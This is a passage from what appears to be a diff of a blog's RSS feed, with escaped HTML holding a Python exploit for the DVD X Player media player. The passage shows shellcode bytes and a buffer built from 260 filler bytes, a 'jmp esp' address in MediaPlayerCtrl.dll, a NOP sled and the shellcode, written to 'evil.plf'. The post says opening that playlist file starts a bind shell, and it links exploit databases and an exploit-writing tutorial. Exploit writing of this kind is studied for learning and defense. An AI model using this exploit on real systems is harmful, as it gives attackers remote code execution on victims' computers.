-&lt;span class=&#34;lineno&#34;&gt;10 &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x12\x79\x08\x6c\x9a\x9c\x39\xbe\xf8\xd5\x6b\x0e\x8a\xb8\x87&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt;11 &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xe5\xde\x28\x1c\x8b\xf6\x5f\x95\x26\x21\x51\x26\x87\xed\x3d&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt;12 &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xe4\x89\x91\x3f\x38\x6a\xab\x8f\x4d\x6b\xec\xf2\xbd\x39\xa5&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt;13 &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x79\x6f\xae\xc2\x3c\xb3\xcf\x04\x4b\x8b\xb7\x21\x8c\x7f\x02&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt;14 &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x2b\xdd\x2f\x19\x63\xc5\x44\x45\x54\xf4\x89\x95\xa8\xbf\xa6&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt;15 &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x6e\x5a\x3e\x6e\xbf\xa3\x70\x4e\x6c\x9a\xbc\x43\x6c\xda\x7b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt;16 &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xbb\x1b\x10\x78\x46\x1c\xe3\x02\x9c\xa9\xf6\xa5\x57\x09\xd3&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt;17 &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x54\xb4\xcc\x90\x5b\x71\x9a\xff\x7f\x84\x4f\x74\x7b\x0d\x6e&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt;18 &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x5b\x0d\x55\x55\x7f\x55\x0e\xf4\x26\x33\xe1\x09\x38\x9b\x5e&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt;19 &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xac\x32\x0e\x8b\xd6\x18\x47\x78\xe5\xa2\x97\x16\x7e\xd0\xa5&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt;20 &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xb9\xd4\x7e\x86\x32\xf3\x79\xe9\x69\x43\x15\x14\x91\xb4\x3f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt;21 &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xd3\xc5\xe4\x57\xf2\x65\x6f\xa8\xfb\xb0\x20\xf8\x53\x6a\x81&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt;22 &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xa8\x13\xda\x69\xa3\x9b\x05\x89\xcc\x71\x30\x8d\x02\xa1\x11&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt;23 &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x7a\x67\x55\x84\x26\xee\xb3\xcc\xc6\xa6\x6c\x78\x25\x9d\xa4&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt;24 &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x1f\x56\xf7\x98\x88\xc0\x4f\xf7\x0e\xee\x4f\xdd\x3d\x43\xe7&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt;25 &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xb6\xb5\x8f\x3c\xa6\xca\x85\x14\xa1\xf3\x4e\xee\xdf\xb6\xef&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt;26 &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xef\xf5\x20\x93\x62\x92\xb0\xda\x9e\x0d\xe7\x8b\x51\x44\x6d&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt;27 &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x26\xcb\xfe\x93\xbb\x8d\x39\x17\x60\x6e\xc7\x96\xe5\xca\xe3&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt;28 &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x88\x33\xd2\xaf\xfc\xeb\x85\x79\xaa\x4d\x7c\xc8\x04\x04\xd3&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt;29 &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x82\xc0\xd1\x1f\x15\x96\xdd\x75\xe3\x76\x6f\x20\xb2\x89\x40&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt;30 &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xa4\x32\xf2\xbc\x54\xbc\x29\x05\x64\xf7\x73\x2c\xed\x5e\xe6&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt;31 &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x6c\x70\x61\xdd\xb3\x8d\xe2\xd7\x4b\x6a\xfa\x92\x4e\x36\xbc&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt;32 &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x4f\x23\x27\x29\x6f\x90\x48\x78&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt;33 &lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt;34 &lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;buffer&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;quot;A&amp;quot;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;260&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt;35 &lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;buffer&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;struct&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt; L&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x6405c20b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#jmp esp [MediaPlayerCtrl.dll]&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt;36 &lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;buffer&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x90&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt;37 &lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;buffer&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt;38 &lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt;39 &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;evil.plf&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;w&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt;40 &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt;41 &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;By loading the plf file, the payload is executed.&lt;/p&gt;
-
-&lt;p&gt;
-
-&lt;figure &gt;
-    &lt;a href=&#34;http://camelinc.info/img/post/2014/dvdxplayer/bind_shell.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Local listening services before and after bind shell is started by opening the custom plf file&#34; &gt;
-        &lt;img src=&#34;http://camelinc.info/img/post/2014/dvdxplayer/bind_shell.png&#34; alt=&#34;Local listening services before and after bind shell is started by opening the custom plf file&#34; &gt;
-    &lt;/a&gt;
-&lt;/figure&gt;
-
-&lt;/p&gt;
-
-&lt;h1 id=&#34;links-and-references&#34;&gt;Links and References&lt;/h1&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;http://www.exploit-db.com/exploits/18109/&#34;&gt;EDB-ID: 18109&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://www.exploit-db.com/exploits/22932/&#34;&gt;EDB-ID: 22932&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/&#34;&gt;Exploit writing tutorial part 1 : Stack Based Overflows&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 </description>
     </item>
